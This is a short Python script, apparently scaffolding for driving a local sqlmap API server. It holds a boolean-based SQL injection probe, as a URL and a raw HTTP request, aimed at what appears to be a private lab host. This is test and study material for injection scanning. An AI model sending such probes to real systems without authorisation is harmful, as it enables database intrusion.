# -*- coding: UTF-8 -*-
import ast
from html.parser import HTMLParser
import func.verify as verify
from urllib import parse

url = "http://192.168.116.129/sqli/example5.php?id=2%20AND%203*2*1=6%20AND%20508=508"
sqli = """GET /sqli/example5.php?id=2%20AND%203*2*1=6%20AND%20508=508 HTTP/1.1
X-Requested-With: XMLHttpRequest
Host: 192.168.116.129
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"""
sql_api = verify.SqlMapApi("127.0.0.1", "8775")

# task_json = sql_api.list()
# print(task_json["tasks"].keys())
# print(sql_api.data("7741402d02a27287"))